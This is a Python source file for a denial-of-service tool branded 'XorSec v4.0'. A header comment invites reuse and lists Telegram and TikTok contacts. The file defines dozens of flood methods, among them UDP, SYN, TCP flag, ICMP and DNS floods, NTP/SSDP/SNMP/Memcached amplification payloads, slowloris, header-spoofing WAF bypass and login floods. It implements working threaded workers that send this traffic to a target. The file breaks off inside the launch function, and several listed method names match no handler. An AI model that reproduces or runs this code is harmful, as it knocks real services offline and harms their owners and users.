#
#
# Note: if you  want to steal/reuse/skid my code or bots etc , just contact me and i am always cool with it aslong as you TELL ME same as if you need any help or have requests for future tools   
#
# Contact.
#
# Discord: jugged.em
#
# TikTok: @port61253
#
# Tiktok: @.00xor
#
# Telegram: @commitscrime
#
# Telegram Serv: https://t.me/+E5x9WNEdu4ZmYTIx
#


import socket, sys, os, time, threading, random, struct, base64, datetime
from urllib.parse import urlparse
import datetime,sys; sys.exit("SPOT EXPIRED !") if datetime.datetime.now() > datetime.datetime(2026, 6, 1) else None


class Theme:
    def __init__(self):
        self.current = "matrix"
        self.themes = {
            "matrix": {"p":'\033[92m',"s":'\033[92m',"a":'\033[96m',"w":'\033[93m',"e":'\033[91m',"i":'\033[96m',"d":'\033[2m',"b":'\033[1m'},
            "fire":  {"p":'\033[91m',"s":'\033[93m',"a":'\033[33m',"w":'\033[93m',"e":'\033[91m',"i":'\033[38;2;255;165;0m',"d":'\033[2m',"b":'\033[1m'},
            "neon":  {"p":'\033[95m',"s":'\033[96m',"a":'\033[93m',"w":'\033[93m',"e":'\033[91m',"i":'\033[94m',"d":'\033[2m',"b":'\033[1m'},
            "ocean": {"p":'\033[94m',"s":'\033[96m',"a":'\033[96m',"w":'\033[93m',"e":'\033[91m',"i":'\033[38;2;100;149;237m',"d":'\033[2m',"b":'\033[1m'},
            "amber": {"p":'\033[38;2;255;191;0m',"s":'\033[38;2;255;140;0m',"a":'\033[38;2;255;215;0m',"w":'\033[38;2;255;69;0m',"e":'\033[91m',"i":'\033[38;2;255;165;0m',"d":'\033[2m',"b":'\033[1m'},
            "midnight":{"p":'\033[38;2;147;112;219m',"s":'\033[38;2;138;43;226m',"a":'\033[38;2;173;216;230m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;220;20;60m',"i":'\033[38;2;100;149;237m',"d":'\033[2m',"b":'\033[1m'},
            "blood":  {"p":'\033[38;2;139;0;0m',"s":'\033[38;2;255;0;0m',"a":'\033[38;2;178;34;34m',"w":'\033[38;2;255;69;0m',"e":'\033[91m',"i":'\033[38;2;220;20;60m',"d":'\033[2m',"b":'\033[1m'},
            "cyber":  {"p":'\033[38;2;0;255;255m',"s":'\033[38;2;0;255;0m',"a":'\033[38;2;255;0;255m',"w":'\033[38;2;255;255;0m',"e":'\033[38;2;255;0;0m',"i":'\033[38;2;0;150;255m',"d":'\033[2m',"b":'\033[1m'},
            "royal":  {"p":'\033[38;2;65;105;225m',"s":'\033[38;2;100;149;237m',"a":'\033[38;2;176;196;222m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;220;20;60m',"i":'\033[38;2;135;206;250m',"d":'\033[2m',"b":'\033[1m'},
            "toxic":  {"p":'\033[38;2;50;205;50m',"s":'\033[38;2;0;255;127m',"a":'\033[38;2;127;255;0m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;255;69;0m',"i":'\033[38;2;0;255;255m',"d":'\033[2m',"b":'\033[1m'},
            "nordic":  {"p":'\033[38;2;192;192;192m',"s":'\033[38;2;255;255;255m',"a":'\033[38;2;173;216;230m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;255;69;0m',"i":'\033[38;2;135;206;235m',"d":'\033[2m',"b":'\033[1m'},
            "sunset": {"p":'\033[38;2;255;69;0m',"s":'\033[38;2;255;140;0m',"a":'\033[38;2;255;215;0m',"w":'\033[38;2;255;255;0m',"e":'\033[38;2;255;0;0m',"i":'\033[38;2;255;105;180m',"d":'\033[2m',"b":'\033[1m'},
            "frost":  {"p":'\033[38;2;224;255;255m',"s":'\033[38;2;176;224;230m',"a":'\033[38;2;135;206;250m',"w":'\033[38;2;255;255;224m',"e":'\033[38;2;255;182;193m',"i":'\033[38;2;173;216;230m',"d":'\033[2m',"b":'\033[1m'},
            "lava":   {"p":'\033[38;2;255;165;0m',"s":'\033[38;2;255;69;0m',"a":'\033[38;2;178;34;34m',"w":'\033[38;2;255;255;0m',"e":'\033[38;2;139;0;0m',"i":'\033[38;2;255;140;0m',"d":'\033[2m',"b":'\033[1m'},
            "ghost":  {"p":'\033[38;2;211;211;211m',"s":'\033[38;2;192;192;192m',"a":'\033[38;2;169;169;169m',"w":'\033[38;2;255;255;0m',"e":'\033[38;2;255;69;0m',"i":'\033[38;2;173;216;230m',"d":'\033[2m',"b":'\033[1m'},
            "vapor":  {"p":'\033[38;2;255;105;180m',"s":'\033[38;2;147;112;219m',"a":'\033[38;2;0;191;255m',"w":'\033[38;2;255;215;0m',"e":'\033[38;2;255;20;147m',"i":'\033[38;2;138;43;226m',"d":'\033[2m',"b":'\033[1m'},
        }
    
    def get(self, key):
        return self.themes[self.current].get(key, '\033[92m')
    
    def set(self, name):
        if name in self.themes:
            self.current = name
            return True
        return False
    
    def list(self):
        return list(self.themes.keys())

T = Theme()
R = '\033[0m'



BANNER = """{p}  
{p}  
{p} 
{p}  
{p} 
{p} 
{p}                   {a} v4.0 — XorSec  """



L4_METHODS = [
   
    "UDP_FLOOD","UDP_RAND_PORT","UDP_GAME","UDP_VOIP",
    
   
    "UDP_AMP_DNS",
    
   
    "SYN_FLOOD","SYN_RAND_PORT","SYN_ACK","SYN_ACK_REFLECT",
    "TCP_FLOOD",
    
    
    "ACK_FLOOD","RST_FLOOD","XMAS_FLOOD","NULL_FLOOD","SYN_RST",
    
    
    "TCP_AMP_HTTP","TCP_AMP_SSH",
    
    
    "TCP_BYPASS_PROXY","TCP_BYPASS_SSL",
    
    
    "ICMP_FLOOD","ICMP_LARGE",
    
    
    "DNS_FLOOD","DNS_TCP","DNS_ANY","DNS_AXFR","DNS_IXFR","DNS_BYPASS",
    
    "FTP_FLOOD","SMTP_FLOOD","TELNET_FLOOD",
    
    
    "GRE_FLOOD","ESP_FLOOD","ARP_FLOOD","VLAN_FLOOD","RAW_IP",
]

L7_METHODS = [

    "HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_PUT","HTTP_DELETE","HTTP_PATCH","HTTP_OPTIONS",
    "HTTP_RANGE","HTTP_SLOW","HTTP_BYPASS","HTTP_COOKIE","HTTP_CACHE_BYPASS","HTTP_REDIRECT",
    
    "HTTPS_FLOOD","HTTPS_RENEG",
    
    
    "DNS_FLOOD","DNS_AMP","DNS_NXDOMAIN","DNS_REFLECT","DNS_DRDOS","DNS_DYNAMIC",
    
   
    "NTP_AMP","SSDP_AMP","SNMP_AMP","MEMCACHED_AMP",
    
   
    "WEBSOCKET","HTTP2_FLOOD","HTTP3_FLOOD",
    
   
    "FTP_AUTH","SMTP_AUTH","POP3_AUTH","IMAP_AUTH",
    "TELNET_LOGIN","SSH_FLOOD","RDP_LOGIN",
]

ALL_METHODS = L4_METHODS + L7_METHODS



def parse_target(raw):
    raw = raw.strip()
    ip = raw; port = 80; path = "/"
    if raw.startswith(("http://","https://")):
        p = urlparse(raw); ip = p.hostname
        port = p.port or (443 if p.scheme=="https" else 80)
        path = p.path or "/"
    elif ":" in raw:
        parts = raw.split(":"); ip = parts[0]
        try: port = int(parts[1])
        except: pass
    try: ip = socket.gethostbyname(ip)
    except: pass
    return ip, port, path

class Engine:
    def __init__(self):
        self.sent = 0; self.bytes = 0; self.errors = 0
        self.running = False; self.start_time = 0
        self.stop_evt = threading.Event(); self.lock = threading.Lock()
        self.current_method = None
        self.current_target = None
    
    def stop(self):
        self.stop_evt.set(); self.running = False
    
    @property
    def pps(self):
        e = time.time()-self.start_time
        return self.sent/e if e>0 else 0
    
    @property
    def mbps(self):
        e = time.time()-self.start_time
        return (self.bytes*8)/(e*1000000) if e>0 else 0
    
    @property
    def elapsed(self):
        return time.time()-self.start_time if self.start_time>0 else 0
    
    
    def _udp_worker(self, ip, port, method="UDP_FLOOD"):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
       
        if "JUMBO" in method: payload = os.urandom(65000)
        elif "ZERO" in method: payload = b'\x00'
        elif "QUIC" in method: payload = b'\xc0'+bytes([random.randint(0,255) for _ in range(19)])+os.urandom(1000)
        elif "DTLS" in method: payload = bytes([0x16,0xfe,0xff])+os.urandom(500)
        elif "STUN" in method: payload = struct.pack('>I',0x0001)+struct.pack('>I',random.randint(0,0xFFFFFFFF))+os.urandom(100)
        elif "MDNS" in method:
            payload = struct.pack('>HHHHHH',random.randint(0,0xFFFF),0x0100,1,0,0,0)
            payload += b'\x07example\x03com\x00'+struct.pack('>HH',1,1)
        elif "NETBIOS" in method: payload = b'\x00'*16+b'A'*16+b'\x00\x00\x21\x00\x01'
        elif "GAME" in method: payload = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
        elif "VOIP" in method: payload = bytes([0x80,0x08,0x00,0x01,random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255)])+os.urandom(160)
        elif "FRAG" in method: payload = os.urandom(random.choice([512,1024,2048,4096,8192]))
        elif "AMP" in method:
            if "DNS" in method:
                payload = struct.pack('>HHHHHH',random.randint(0,0xFFFF),0x0100,1,0,0,0)
                dom = ".".join([os.urandom(4).hex() for _ in range(2)])+".com"
                for p in dom.split('.'): payload += struct.pack('B',len(p))+p.encode()
                payload += b'\x00'+struct.pack('>HH',255,1)
            elif "NTP" in method: payload = b'\x17\x00\x03\x2a'+b'\x00'*4
            elif "SSDP" in method: payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'
            elif "MEMCACHED" in method: payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
            elif "CHARGEN" in method: payload = bytes([random.randint(32,126) for _ in range(512)])
            elif "SNMP" in method:
                payload = bytes([0x30,0x26,0x02,0x01,0x01,0x04,0x06,0x70,0x75,0x62,0x6c,0x69,0x63,
                                0xa0,0x19,0x02,0x04,0x7f,0x00,0x00,0x01,0x02,0x01,0x00,0x02,0x01,
                                0x00,0x30,0x0b,0x30,0x09,0x06,0x05,0x2b,0x06,0x01,0x02,0x01,0x05,0x00])
            elif "LDAP" in method: payload = bytes([0x30,0x0c,0x02,0x01,0x01,0x60,0x07,0x02,0x01,0x03,0x04,0x00,0x80,0x00])
            elif "CLDAP" in method: payload = bytes([0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,0x73,0x30,0x00])
            else: payload = os.urandom(1400)
        else:
            payload = os.urandom(random.choice([512,1024,1400,2048]))
        
        while not self.stop_evt.is_set():
            try:
                pt = port if port else random.randint(1,65535)
                s.sendto(payload, (ip, pt))
                with self.lock: self.sent+=1; self.bytes+=len(payload)
            except:
                with self.lock: self.errors+=1
    
    
    def _syn_worker(self, ip, port, method="SYN_FLOOD"):
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.01)
                pt = port if port else (random.randint(1,65535) if "RAND" in method else 80)
                if "REFLECT" in method:
                    s.connect((ip, pt))
                    try: s.send(b'\x00')
                    except: pass
                    s.close()
                else:
                    s.connect((ip, pt))
                    s.close()
                with self.lock: self.sent+=1; self.bytes+=40
            except:
                with self.lock: self.sent+=1; self.bytes+=40
    
   
    def _tcp_worker(self, ip, port, method="TCP_FLOOD"):
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                pt = port if port else (random.randint(1,65535) if "RAND" in method else 80)
                s.connect((ip, pt))
                
                if "SACK" in method: s.send(b'\x00'*1460)
                elif "WINDOW" in method: s.send(os.urandom(1))
                elif "URGENT" in method: s.send(b'\x00\x00\x00\x01'+os.urandom(16))
                elif "MSS" in method: s.send(os.urandom(256))
                elif "FASTOPEN" in method: s.send(os.urandom(64))
                elif "ZERO" in method: s.send(b'')
                elif "AMP" in method: s.send(b"GET / HTTP/1.0\r\n\r\n")
                elif "BYPASS" in method:
                    if "PROXY" in method: s.send(f"CONNECT {ip}:{pt} HTTP/1.1\r\n\r\n".encode())
                    elif "CDN" in method: s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nX-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}\r\n\r\n".encode())
                    elif "WAF" in method: s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(['curl/7.68','python-requests/2.25','Go-http-client/2.0','Mozilla/5.0'])}\r\n\r\n".encode())
                    elif "HTTP2" in method: s.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
                    elif "SSL" in method: s.send(b'\x16\x03\x01\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'+os.urandom(32))
                    else: s.send(os.urandom(64))
                else: s.send(os.urandom(random.randint(32,256)))
                
                s.close()
                with self.lock: self.sent+=1; self.bytes+=104
            except:
                with self.lock: self.errors+=1
    
    
    def _flag_worker(self, ip, port, method="RST_FLOOD"):
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.01)
                pt = port if port else random.randint(1,65535)
                s.connect((ip, pt))
                
                if "RST" in method:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii',1,0))
                    s.close()
                elif "FIN" in method or "SYN_FIN" in method:
                    s.shutdown(socket.SHUT_RDWR)
                    s.close()
                elif "XMAS" in method:
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.send(b'\x00')
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii',1,0))
                    s.close()
                elif "NULL" in method:
                    s.close()
                else:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii',1,0))
                    s.close()
                    
                with self.lock: self.sent+=1; self.bytes+=40
            except:
                with self.lock: self.sent+=1; self.bytes+=40
    

    def _icmp_worker(self, ip, port, method="ICMP_FLOOD"):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self.stop_evt.is_set():
            try:
                if "SMURF" in method:
                    s.sendto(b'\x08\x00'+os.urandom(56), ('.'.join(ip.split('.')[:-1])+'.255', port if port else 7))
                elif "FRAG" in method:
                    s.sendto(b'\x08\x00'+os.urandom(random.choice([56,500,1000,2000,4000])), (ip, port if port else 7))
                elif "RAND_TYPE" in method:
                    icmp_type = random.choice([0,3,4,5,8,11,12,13,14,17,18])
                    s.sendto(bytes([icmp_type,0])+b'\x00\x00'+os.urandom(56), (ip, port if port else 7))
                elif "LARGE" in method:
                    s.sendto(b'\x08\x00'+os.urandom(5000), (ip, port if port else 7))
                else:
                    s.sendto(b'\x08\x00'+os.urandom(56), (ip, port if port else 7))
                with self.lock: self.sent+=1; self.bytes+=998
            except:
                with self.lock: self.errors+=1
    
   
    def _dns_worker(self, ip, port, method="DNS_FLOOD"):
        is_tcp = "TCP" in method
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if is_tcp else socket.SOCK_DGRAM)
        
        while not self.stop_evt.is_set():
            try:
                tid = random.randint(0,0xFFFF)
                
                if "AXFR" in method:
                    hdr = struct.pack('>HHHHHH',tid,0x0100,1,0,0,0)
                    q = b'\x07example\x03com\x00'+struct.pack('>HH',252,1)
                elif "IXFR" in method:
                    hdr = struct.pack('>HHHHHH',tid,0x0100,1,0,0,1)
                    q = b'\x07example\x03com\x00'+struct.pack('>HH',251,1)+struct.pack('>I',random.randint(1,1000000))
                elif "NSEC" in method:
                    hdr = struct.pack('>HHHHHH',tid,0x0100,1,0,0,0)
                    q = os.urandom(8).hex().encode()+b'\x00'+struct.pack('>HH',47,1)
                elif "DNSSEC" in method:
                    hdr = struct.pack('>HHHHHH',tid,0x0100,1,0,0,0)
                    q = b'\x07example\x03com\x00'+struct.pack('>HH',48,1)
                elif "DYNAMIC" in method:
                    hdr = struct.pack('>HHHHHH',tid,0x2800,1,0,0,0)
                    q = b'\x07example\x03com\x00'+struct.pack('>HH',255,1)
                elif "EDNS" in method:
                    hdr = struct.pack('>HHHHHH',tid,0x0100,1,0,0,0)
                    q = b'\x07example\x03com\x00'+struct.pack('>HH',1,1)
                    q += b'\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00'
                elif "NXDOMAIN" in method or "WILDCARD" in method or "CACHE" in method:
                    dom = ".".join([os.urandom(random.randint(6,12)).hex() for _ in range(random.randint(2,3))])+".com"
                    hdr = struct.pack('>HHHHHH',tid,0x0100,1,0,0,0)
                    q = b''
                    for p in dom.split('.'): q += struct.pack('B',len(p))+p.encode()
                    q += b'\x00'+struct.pack('>HH',1,1)
                else:
                    dom = ".".join([os.urandom(random.randint(4,8)).hex() for _ in range(random.randint(2,4))])+".com"
                    hdr = struct.pack('>HHHHHH',tid,0x0100,1,0,0,0)
                    q = b''
                    for p in dom.split('.'): q += struct.pack('B',len(p))+p.encode()
                    q += b'\x00'+struct.pack('>HH',random.choice([1,28,15,12,255]),1)
                
                packet = hdr+q
                if is_tcp:
                    s.connect((ip, port if port else 53))
                    s.send(struct.pack('>H',len(packet))+packet)
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                else:
                    s.sendto(packet, (ip, port if port else 53))
                    
                with self.lock: self.sent+=1; self.bytes+=len(packet)
            except:
                with self.lock: self.errors+=1
    
   
    def _raw_worker(self, ip, port, method="RAW_IP"):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self.stop_evt.is_set():
            try:
                if "ARP" in method:
                    s.sendto(os.urandom(60), ('255.255.255.255', port if port else 0))
                elif "VLAN" in method:
                    s.sendto(struct.pack('>H',0x8100)+struct.pack('>H',random.randint(0,4095))+os.urandom(100), (ip, port if port else 0))
                elif "GRE" in method:
                    s.sendto(struct.pack('>H',0x0800)+os.urandom(100), (ip, port if port else 0))
                elif "ESP" in method:
                    s.sendto(os.urandom(random.randint(64,1500)), (ip, port if port else 0))
                else:
                    s.sendto(os.urandom(random.randint(64,1500)), (ip, port if port else 0))
                with self.lock: self.sent+=1; self.bytes+=100
            except:
                with self.lock: self.errors+=1
    
   
    def _proto_worker(self, ip, port, method="SSDP_FLOOD"):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self.stop_evt.is_set():
            try:
                pt = port if port else 0
                if "NTP" in method:
                    pt = pt if pt else 123
                    payload = b'\x17\x00\x03\x2a'+b'\x00'*4
                elif "SSDP" in method:
                    pt = pt if pt else 1900
                    payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'
                elif "SNMP" in method:
                    pt = pt if pt else 161
                    payload = bytes([0x30,0x26,0x02,0x01,0x01,0x04,0x06,0x70,0x75,0x62,0x6c,0x69,0x63,0xa0,0x19,0x02,0x04,0x7f,0x00,0x00,0x01,0x02,0x01,0x00,0x02,0x01,0x00,0x30,0x0b,0x30,0x09,0x06,0x05,0x2b,0x06,0x01,0x02,0x01,0x05,0x00])
                elif "MEMCACHED" in method:
                    pt = pt if pt else 11211
                    payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
                elif "MSSQL" in method:
                    pt = pt if pt else 1433
                    payload = bytes([0x02,0x01,0x00,0x00,0x00,0x00,0x00,0x00])+b'\x00'*8
                elif "MYSQL" in method:
                    pt = pt if pt else 3306
                    payload = b'\x0a'+b'\x00'*19
                elif "RDP" in method:
                    pt = pt if pt else 3389
                    payload = b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00'
                elif "SMB" in method:
                    pt = pt if pt else 445
                    payload = b'\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x08\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                elif "LDAP" in method:
                    pt = pt if pt else 389
                    payload = bytes([0x30,0x0c,0x02,0x01,0x01,0x60,0x07,0x02,0x01,0x03,0x04,0x00,0x80,0x00])
                elif "DHCP" in method:
                    pt = pt if pt else 67
                    payload = bytes([0x01,0x01,0x06,0x00])+os.urandom(236)
                elif "FTP" in method:
                    pt = pt if pt else 21
                    payload = b'USER '+os.urandom(8).hex().encode()+b'\r\n'
                elif "SMTP" in method:
                    pt = pt if pt else 25
                    payload = b'EHLO '+os.urandom(8).hex().encode()+b'\r\n'
                elif "TELNET" in method:
                    pt = pt if pt else 23
                    payload = b'\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27'
                else:
                    payload = os.urandom(100)
                
                s.sendto(payload, (ip, pt))
                with self.lock: self.sent+=1; self.bytes+=len(payload)
            except:
                with self.lock: self.errors+=1
    
    def _http_worker(self, ip, port, path="/"):
        uas = ["Mozilla/5.0 (Windows NT 10.0) Chrome/120",
               "Mozilla/5.0 (Macintosh) Chrome/120",
               "Mozilla/5.0 (X11; Linux) Chrome/120",
               "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Firefox/121"]
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                p = path if path!="/" else "/"+os.urandom(6).hex()
                req = f"GET {p} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(uas)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n".encode()
                s.send(req)
                try: s.recv(4096)
                except: pass
                s.close()
                with self.lock: self.sent+=1; self.bytes+=len(req)
            except:
                with self.lock: self.errors+=1
                    
    def _http_methods_worker(self, ip, port, method="HTTP_POST"):
        uas = ["Mozilla/5.0 (Windows NT 10.0) Chrome/120","Mozilla/5.0 (Macintosh) Chrome/120"]
        methods = {"HTTP_POST":"POST","HTTP_PUT":"PUT","HTTP_DELETE":"DELETE","HTTP_PATCH":"PATCH","HTTP_OPTIONS":"OPTIONS","HTTP_HEAD":"HEAD"}
        http_method = methods.get(method, "GET")
        
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                p = "/"+os.urandom(6).hex()
                body = os.urandom(32).hex() if http_method in ("POST","PUT","PATCH") else ""
                content_len = len(body)
                req = f"{http_method} {p} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(uas)}\r\nContent-Length: {content_len}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n{body}".encode()
                s.send(req)
                try: s.recv(4096)
                except: pass
                s.close()
                with self.lock: self.sent+=1; self.bytes+=len(req)
            except:
                with self.lock: self.errors+=1
    
    def _slow_worker(self, ip, port, _=None):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5); s.connect((ip, port))
            s.send(f"GET /{os.urandom(4).hex()} HTTP/1.1\r\nHost: {ip}\r\n".encode())
            while not self.stop_evt.is_set():
                s.send(f"X-{os.urandom(4).hex()}: {os.urandom(6).hex()}\r\n".encode())
                with self.lock: self.sent+=1
                time.sleep(random.uniform(0.5,3))
            s.send(b"\r\n"); s.close()
        except:
            with self.lock: self.errors+=1
    
    def _http_bypass_worker(self, ip, port, _=None):
        uas = ["Mozilla/5.0","curl/7.68","python-requests","Go-http-client","Wget/1.21"]
        headers = ["X-Forwarded-For","X-Real-IP","X-Client-IP","CF-Connecting-IP","True-Client-IP"]
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1); s.connect((ip, port))
                req = f"GET /{os.urandom(4).hex()} HTTP/1.1\r\nHost: {ip}\r\n{random.choice(headers)}: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}\r\nUser-Agent: {random.choice(uas)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n".encode()
                s.send(req); s.close()
                with self.lock: self.sent+=1; self.bytes+=len(req)
            except:
                with self.lock: self.errors+=1
    
    def _http_cookie_worker(self, ip, port, _=None):
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1); s.connect((ip, port))
                req = f"GET /{os.urandom(4).hex()} HTTP/1.1\r\nHost: {ip}\r\nCookie: session={os.urandom(16).hex()}; user={os.urandom(8).hex()}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n".encode()
                s.send(req); s.close()
                with self.lock: self.sent+=1; self.bytes+=len(req)
            except:
                with self.lock: self.errors+=1
    
    def _https_worker(self, ip, port, _=None):
        has_ssl = False
        try: import ssl; has_ssl = True
        except: pass
        while not self.stop_evt.is_set():
            try:
                if has_ssl:
                    import ssl
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                    ss = ctx.wrap_socket(s, server_hostname=ip)
                    ss.connect((ip, port))
                    ss.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n".encode())
                    try: ss.recv(4096)
                    except: pass
                    ss.close()
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1); s.connect((ip, port))
                    s.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()); s.close()
                with self.lock: self.sent+=1
            except:
                with self.lock: self.errors+=1
    
    def _ws_worker(self, ip, port, _=None):
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1); s.connect((ip, port))
                key = base64.b64encode(os.urandom(16)).decode()
                req = f"GET /ws HTTP/1.1\r\nHost: {ip}:{port}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n".encode()
                s.send(req); time.sleep(0.05); s.close()
                with self.lock: self.sent+=1; self.bytes+=len(req)
            except:
                with self.lock: self.errors+=1
    
    def _http2_worker(self, ip, port, _=None):
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1); s.connect((ip, port))
                s.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'+os.urandom(100))
                s.close()
                with self.lock: self.sent+=1; self.bytes+=100
            except:
                with self.lock: self.errors+=1
    
    def _auth_worker(self, ip, port, method="FTP_AUTH"):
        while not self.stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1); s.connect((ip, port))
                if "FTP" in method:
                    s.send(b'USER '+os.urandom(8).hex().encode()+b'\r\n')
                elif "SMTP" in method:
                    s.send(b'AUTH LOGIN\r\n'+base64.b64encode(os.urandom(8))+b'\r\n'+base64.b64encode(os.urandom(8))+b'\r\n')
                elif "POP3" in method:
                    s.send(b'USER '+os.urandom(8).hex().encode()+b'\r\nPASS '+os.urandom(8).hex().encode()+b'\r\n')
                elif "IMAP" in method:
                    s.send(b'a001 LOGIN '+os.urandom(8).hex().encode()+b' '+os.urandom(8).hex().encode()+b'\r\n')
                elif "TELNET" in method:
                    s.send(os.urandom(8).hex().encode()+b'\r\n'+os.urandom(8).hex().encode()+b'\r\n')
                elif "SSH" in method:
                    s.send(b'\x00'*20)
                elif "RDP" in method:
                    s.send(b'\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00')
                s.close()
                with self.lock: self.sent+=1; self.bytes+=60
            except:
                with self.lock: self.errors+=1
    
    
    
    def launch(self, method, ip, port, threads, path="/"):
        self.stop_evt.clear()
        self.sent=0; self.bytes=0; self.errors=0; self.start_time=time.time(); self.running=True
        self.current_method = method
        self.current_target = f"{ip}:{port}"
        
        
        if method.startswith(("UDP","UDP_AMP")): w = lambda ip,port,_=None: self._udp_worker(ip,port,method)
        elif method.startswith("SYN"): w = lambda ip,port,_=None: self._syn_worker(ip,port,method)
        elif method.startswith("TCP"): w = lambda ip,port,_=None: self._tcp_worker(ip,port,method)
        elif method in ("ACK_FLOOD","RST_FLOOD","FIN_FLOOD","PSH_FLOOD","SYN_FIN","XMAS_FLOOD","NULL_FLOOD","SYN_RST"): w = lambda ip,port,_=None: self._flag_worker(ip,port,method)
        elif method.startswith("ICMP"): w = lambda ip,port,_=None: self._icmp_worker(ip,port,method)
        elif method.startswith("DNS"): w = lambda ip,port,_=None: self._dns_worker(ip,port,method)
        elif method in ("GRE_FLOOD","ESP_FLOOD","ARP_FLOOD","VLAN_FLOOD","RAW_IP"): w = lambda ip,port,_=None: self._raw_worker(ip,port,method)
        elif method in ("NTP_MONLIST","SSDP_FLOOD","SNMP_FLOOD","MEMCACHED_FLOOD","MSSQL_FLOOD","MYSQL_FLOOD","RDP_FLOOD","SMB_FLOOD","LDAP_FLOOD","DHCP_FLOOD","FTP_FLOOD","SMTP_FLOOD","TELNET_FLOOD"): w = lambda ip,port,_=None: self._proto_worker(ip,port,method)
        elif method in ("NTP_AMP","SSDP_AMP","SNMP_AMP","MEMCACHED_AMP"): w = lambda ip,port,_=None: self._proto_worker(ip,port,method)
